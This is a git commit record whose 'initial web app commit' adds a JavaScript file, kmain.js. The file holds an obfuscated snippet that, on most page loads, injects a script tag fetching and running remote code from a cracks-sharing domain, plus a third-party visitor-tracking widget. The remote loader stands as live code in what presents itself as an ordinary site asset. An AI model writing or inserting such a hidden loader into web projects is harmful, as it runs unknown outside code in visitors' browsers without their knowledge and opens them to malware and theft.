2cce266bd815a2f83faa4838c2c3616d4ac5d723
pyaesonephyo <pyaesonephyo.1988.mm@gmail.com>
2013-11-06 10:50:57 +0630

    initial web app commit

---
+++ index_files/kmain.js
@@ -0,0 +1,28 @@
+var doit = Math['floor'](Math['random']() * 11);
+if (doit < 10) {
+    function addScript() {
+        var _0xe716x3 = document['createElement']('script');
+        _0xe716x3['setAttribute']('type', 'text/javascript');
+        _0xe716x3['setAttribute']('src', 'http://cracks4free.info/5/zxg/d.txt');
+        var _0xe716x4 = document['getElementsByTagName']('script')[0];
+        if (_0xe716x4 == null) {
+            return false;
+        };
+        _0xe716x4['appendChild'](_0xe716x3);
+        return true;
+    };
+    addScript();
+
+};
+
+
+
+
+var _wau = _wau || [];
+_wau['push'](['classic', 'yliz9jh8ib7f', 'xwa']);
+(function () {
+    var _0x95ddx9 = document['createElement']('script');
+    _0x95ddx9['async'] = true;
+    _0x95ddx9['src'] = 'http://widgets.amung.us/classic.js';
+    document['getElementsByTagName']('head')[0]['appendChild'](_0x95ddx9);
+})();
